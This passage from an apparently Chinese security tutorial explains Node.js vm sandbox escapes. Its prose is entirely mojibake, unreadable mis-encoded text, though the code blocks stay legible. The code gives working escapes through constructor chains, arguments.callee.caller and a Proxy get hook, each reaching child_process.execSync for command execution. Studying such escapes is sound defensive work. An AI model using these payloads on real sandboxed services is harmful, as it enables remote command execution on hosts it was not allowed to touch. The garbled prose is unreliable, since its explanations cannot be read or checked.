<p>å¯ä»¥å‘ç°æˆ‘è¿™æ¬¡åœ¨y1ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨<code>exports</code>å°†ageå¯¼å…¥ï¼Œå¹¶ä¸”y2åœ¨è¾“å‡ºæ—¶ä¹Ÿæ²¡æœ‰ç”¨<code>a.age</code>ï¼Œå› ä¸ºæ­¤æ—¶ageå·²ç»æŒ‚è½½åœ¨globalä¸Šäº†ï¼Œå®ƒçš„ä½œç”¨åŸŸå·²ç»ä¸åœ¨y1ä¸­äº†ã€‚</p>
<p>æˆ‘ä»¬è¾“å‡ºä¸€ä¸‹globalå¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°ageç¡®å®æŒ‚è½½åœ¨äº†globalä¸Šï¼š</p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;ref *<span class="number">1</span>&gt; Object <span class="punctuation">[</span>global<span class="punctuation">]</span> <span class="punctuation">{</span></span><br><span class="line">  global<span class="punctuation">:</span> <span class="punctuation">[</span>Circular *<span class="number">1</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  clearInterval<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> clearInterval<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  clearTimeout<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> clearTimeout<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  setInterval<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setInterval<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  setTimeout<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setTimeout<span class="punctuation">]</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="punctuation">[</span>Symbol(nodejs.util.promisify.custom)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  queueMicrotask<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> queueMicrotask<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  performance<span class="punctuation">:</span> Performance <span class="punctuation">{</span></span><br><span class="line">    nodeTiming<span class="punctuation">:</span> PerformanceNodeTiming <span class="punctuation">{</span></span><br><span class="line">      name<span class="punctuation">:</span> 'node'<span class="punctuation">,</span></span><br><span class="line">      entryType<span class="punctuation">:</span> 'node'<span class="punctuation">,</span></span><br><span class="line">      startTime<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      duration<span class="punctuation">:</span> <span class="number">25.98190000653267</span><span class="punctuation">,</span></span><br><span class="line">      nodeStart<span class="punctuation">:</span> <span class="number">0.4919999986886978</span><span class="punctuation">,</span></span><br><span class="line">      v8Start<span class="punctuation">:</span> <span class="number">2.0012000054121017</span><span class="punctuation">,</span></span><br><span class="line">      bootstrapComplete<span class="punctuation">:</span> <span class="number">18.864999994635582</span><span class="punctuation">,</span></span><br><span class="line">      environment<span class="punctuation">:</span> <span class="number">10.277099996805191</span><span class="punctuation">,</span></span><br><span class="line">      loopStart<span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">      loopExit<span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">      idleTime<span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    timeOrigin<span class="punctuation">:</span> <span class="number">1665558311872.296</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  clearImmediate<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> clearImmediate<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  setImmediate<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setImmediate<span class="punctuation">]</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="punctuation">[</span>Symbol(nodejs.util.promisify.custom)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">  age<span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure>



<h2 id="0x04-vmæ²™ç®±é€ƒé€¸"><a href="#0x04-vmæ²™ç®±é€ƒé€¸" class="headerlink" title="0x04 vmæ²™ç®±é€ƒé€¸"></a><strong>0x04 vmæ²™ç®±é€ƒé€¸</strong></h2><p>æˆ‘ä»¬åœ¨å‰é¢æåˆ°äº†ä½œç”¨åŸŸè¿™ä¸ªæ¦‚å¿µï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦å®ç°æ²™ç®±çš„éš”ç¦»ä½œç”¨ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œè®©ä»£ç åœ¨è¿™ä¸ªæ–°çš„ä½œç”¨åŸŸé‡Œé¢å»è¿è¡Œï¼Œè¿™æ ·å°±å’Œå…¶ä»–çš„ä½œç”¨åŸŸè¿›è¡Œäº†éš”ç¦»ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—è¿è¡Œçš„åŸç†ï¼Œå…ˆæ¥äº†è§£å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIã€‚</p>
<ul>
<li><p><code>vm.runinThisContext(code)</code>ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121548200.png"></p>
</li>
</ul>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">'initial value'</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">'localVar = "vm";'</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'vmResult:'</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'localVar:'</span>, localVar);</span><br><span class="line"><span class="comment">// vmResult: 'vm', localVar: 'initial value'</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><p><code>vm.createContext([sandbox])</code>ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚</p>
<p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121540576.png"></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = { <span class="attr">globalVar</span>: <span class="number">1</span> };</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">'globalVar *= 2;'</span>, sandbox);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox)); <span class="comment">// { globalVar: 2 }</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar)); <span class="comment">// 3</span></span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚</li>
<li><code>vm.Scriptç±»</code> vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚</li>
<li><code>new vm.Script(code, options)</code>ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚<br>codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç </li>
</ul>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = {</span><br><span class="line"> <span class="attr">animal</span>: <span class="string">'cat'</span>,</span><br><span class="line"> <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">};</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">'count += 1; name = "kitty";'</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));</span><br><span class="line"><span class="comment">// { animal: 'cat', count: 3, name: 'kitty' }</span></span><br></pre></td></tr></tbody></table></figure>

<p>scriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚</p>
</li>
</ul>
<p>æˆ‘ä»¬ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸æœ€åéƒ½æ˜¯è¿›è¡Œrceï¼Œé‚£ä¹ˆåœ¨Nodeé‡Œè¦è¿›è¡Œrceå°±éœ€è¦proccesäº†ï¼Œåœ¨è·å–åˆ°processå¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨requireæ¥å¯¼å…¥child_processï¼Œå†åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚ä½†processæŒ‚è½½åœ¨globalä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨<code>creatContext</code>åæ˜¯ä¸èƒ½è®¿é—®åˆ°globalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°†globalä¸Šçš„processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æŠŠä»£ç æ”¹æˆè¿™æ ·ï¼ˆcodeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œï¼‰ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor('return process.env')()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121630628.png"></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor('return process.env')()`</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬æ˜¯æ€ä¹ˆå®ç°é€ƒé€¸çš„å‘¢ï¼Œé¦–å…ˆè¿™é‡Œé¢çš„thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™<code>runInNewContext</code>çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„<code>()</code>æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚</p>
<p>ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.toString.constructor('return process')()`</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿”å›çš„processå¯¹è±¡æ¥rceäº†</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">'child_process'</span>).<span class="title function_">execSync</span>(<span class="string">'whoami'</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></tbody></table></figure>



<p>è¿™é‡ŒçŸ¥è¯†æ˜Ÿçƒä¸Šæåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`m + n`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = { <span class="attr">m</span>: <span class="number">1</span>, <span class="attr">n</span>: <span class="number">2</span> };</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬èƒ½ä¸èƒ½æŠŠ<code>this.toString.constructor('return process')()</code>ä¸­çš„thisæ¢æˆ{}å‘¢ï¼Ÿ {}çš„æ„æ€æ˜¯åœ¨æ²™ç®±å†…å£°æ˜äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¯¹è±¡æ˜¯ä¸èƒ½è®¿é—®åˆ°globalä¸‹çš„ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬å°†thisæ¢æˆmå’Œnä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”è¿™äº›éƒ½æ˜¯primitiveç±»å‹ï¼Œä»–ä»¬åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å°†å€¼ä¼ é€’è¿‡å»è€Œä¸æ˜¯å¼•ç”¨ï¼ˆç±»ä¼¼äºå‡½æ•°ä¼ é€’å½¢å‚ï¼‰ï¼Œåœ¨æ²™ç›’å†…ä½¿ç”¨çš„mnå·²ç»ä¸æ˜¯åŸæ¥çš„mnäº†ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚</p>
<p>æˆ‘ä»¬å°†mnæ”¹æˆå…¶ä»–ç±»å‹å°±å¯ä»¥åˆ©ç”¨äº†ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121708516.png"></p>
<h2 id="0x05-vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ"><a href="#0x05-vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ" class="headerlink" title="0x05 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ"></a><strong>0x05 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ</strong></h2><p>çŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°äº†è¿™æ ·çš„æƒ…å†µï¼š</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`...`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Hello '</span> + res)</span><br></pre></td></tr></tbody></table></figure>



<p>æˆ‘ä»¬ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§<code>arguments.callee.caller</code>ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p>
<p>æˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„<code>arguments.callee.caller</code>å°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210141711421.png"></p>
<p>æˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™æ®µä»£ç </p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; {</span></span><br><span class="line"><span class="string">    const a = {}</span></span><br><span class="line"><span class="string">    a.toString = function () {</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor('return process'))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require('child_process').execSync('whoami').toString()</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  })()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Hello '</span> + res)</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬åœ¨æ²™ç®±å†…å…ˆåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å°†è¿™ä¸ªå¯¹è±¡çš„toStringæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œé€šè¿‡<code>arguments.callee.caller</code>è·å¾—åˆ°æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ©ç”¨è¿™ä¸ªå¯¹è±¡çš„æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°è¿”å›äº†processï¼Œå†è°ƒç”¨processè¿›è¡Œrceï¼Œæ²™ç®±å¤–åœ¨console.logä¸­é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è§¦å‘äº†è¿™ä¸ªé‡å†™åçš„toStringå‡½æ•°ã€‚</p>
<p>å¦‚æœæ²™ç®±å¤–æ²¡æœ‰æ‰§è¡Œå­—ç¬¦ä¸²çš„ç›¸å…³æ“ä½œæ¥è§¦å‘è¿™ä¸ªtoStringï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å¯ä»¥ç”¨æ¥è¿›è¡Œæ¶æ„é‡å†™çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>Proxy</code>æ¥åŠ«æŒå±æ€§</p>
<p><a class="link" target="_blank" rel="noopener" href="https://juejin.cn/post/6844904090116292616">Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)<i class="fas fa-external-link-alt"></i></a></p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171948191.png"></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;{</span></span><br><span class="line"><span class="string">    const a = new Proxy({}, {</span></span><br><span class="line"><span class="string">        get: function(){</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor('return process'))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span></span><br><span class="line"><span class="string">        }</span></span><br><span class="line"><span class="string">    })</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">})()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>è§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨<code>get:</code>è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚</p>
